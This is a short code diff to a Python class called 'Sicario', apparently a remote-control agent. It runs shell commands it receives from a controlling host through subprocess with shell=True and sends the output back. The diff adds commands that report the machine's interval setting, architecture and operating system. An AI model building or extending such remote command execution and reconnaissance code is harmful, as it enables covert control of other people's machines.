@@ -1,5 +1,5 @@
 from __future__ import division
-import socket, subprocess, os, math
+import socket, subprocess, os, math, platform
 
 class Sicario:
 	daemon = False
@@ -61,13 +61,21 @@ class Sicario:
 
 		if command[0] == 'execute':
 			self.__send(subprocess.check_output(' '.join(command[1:]), shell=True))
-		elif command [0] == 'set':
+		elif command[0] == 'set':
 			if command[1] == 'interval':
 				self.daemon.interval = command[2]
 				self.__send('ok')
 				with open('/etc/sicario/sicario.conf', 'w+') as f:
 					f.write('{},{},{},{}'.format(self.host, self.port, self.key, command[2]))
 					f.close()
+		elif command[0] == 'get':
+			if command[1] == 'interval':
+				self.__send(self.daemon.interval)
+			elif command[1] == 'architecture':
+				self.__send(platform.architecture()[0])
+			elif command[1] == 'system':
+				self.__send(platform.system())
+
 
 
 	def __send (self, data):
